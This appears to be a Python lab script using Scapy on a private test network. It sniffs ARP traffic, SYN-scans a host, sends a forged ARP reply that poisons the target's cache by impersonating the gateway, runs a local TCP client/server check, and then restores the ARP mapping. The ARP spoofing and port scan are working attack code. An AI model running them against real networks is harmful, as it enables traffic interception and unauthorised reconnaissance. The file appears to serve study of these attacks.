from scapy.all import sniff, ARP, IP, TCP, send, sr1
import time
import socket
from threading import Thread

# ARP monitoring
def packet_callback(packet):
    print("Entering ARP monitoring function.")
    if packet.haslayer(ARP):
        print(f"ARP Request: {packet[ARP].psrc} is asking about {packet[ARP].pdst}")
    print("Exiting ARP monitoring function.")

# Timer for 10 seconds
def monitor_arp_with_timer():
    print("Starting ARP monitoring for 10 seconds...")
    start_time = time.time()
    sniff(filter="arp", prn=packet_callback, store=0, timeout=10)
    elapsed_time = time.time() - start_time
    print(f"ARP monitoring completed. Duration: {elapsed_time:.2f} seconds")

monitor_arp_with_timer()

# SYN scan
def syn_scan(ip, port):
    print(f"Entering SYN scan function for IP {ip} and port {port}.")
    packet = IP(dst=ip)/TCP(dport=port, flags="S")
    response = sr1(packet, timeout=1, verbose=0)
    if response and response.haslayer(TCP) and response[TCP].flags == "SA":
        print(f"Port {port} is open on {ip}")
    else:
        print(f"Port {port} is closed or filtered on {ip}.")
    print(f"Exiting SYN scan function for port {port}.")

print("Starting SYN scan...")
for port in range(20, 25):
    syn_scan("10.0.0.2", port)
print("Finished SYN scan.")

# ARP spoofing
def arp_spoof(target_ip, spoof_ip, target_mac):
    print(f"Entering ARP spoofing function with target {target_ip} spoofed as {spoof_ip}.")
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=0)
    print(f"ARP spoofing packet sent: Target={target_ip}, Spoofed IP={spoof_ip}, Target MAC={target_mac}.")
    print("Exiting ARP spoofing function.")

print("Starting ARP spoofing...")
arp_spoof("10.0.0.2", "10.0.0.1", "00:00:00:00:00:02")  # Spoof h2
print("Finished ARP spoofing.")


# TCP Server
def run_server():
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("", 9999))  # Bind to port 9999
        server.listen(5)
        print("Server: Listening on port 9999")
        while True:
            client, address = server.accept()
            print(f"Server: Connection from {address}")
            client.send(b"Welcome!")
            client.close()
            print("Server: Connection closed")
            break
    except Exception as e:
        print(f"Server: Error occurred - {e}")
    finally:
        server.close()
        print("Server: Socket closed")
# TCP Client
def run_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(("127.0.0.1", 9999))  # Connect to the server
        print("Client: Connected to the server")
        data = client.recv(1024)  # Receive the server's message
        print(f"Client: Received from server - {data.decode()}")
    except ConnectionRefusedError:
        print("Client: Could not connect to the server. Ensure it is running.")
    except Exception as e:
        print(f"Client: Error occurred - {e}")
    finally:
        client.close()
        print("Client: Socket closed")
# Run the server and client in separate threads for testing
server_thread = Thread(target=run_server)
client_thread = Thread(target=run_client)
print("Main: Starting server thread")
server_thread.start()
print("Main: Starting client thread")
client_thread.start()
server_thread.join()
print("Main: Server thread finished")
client_thread.join()
print("Main: Client thread finished")


# ARP Cleaning
def clean_arp(target_ip, real_mac, target_mac):
    """
    Sends a corrective ARP packet to restore the legitimate mapping of the target IP to the real MAC.
    """
    try:
        print(f"ARP Cleaner: Sending corrective ARP for IP {target_ip}")
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, hwsrc=real_mac)
        send(packet, verbose=0)
        print(f"ARP Cleaner: Corrective ARP sent for {target_ip} -> {real_mac}")
    except Exception as e:
        print(f"ARP Cleaner: Error occurred - {e}")


# Restore ARP table
clean_arp("10.0.0.2", "00:00:00:00:00:03", "00:00:00:00:00:02")
print("Main: ARP cleaning completed")
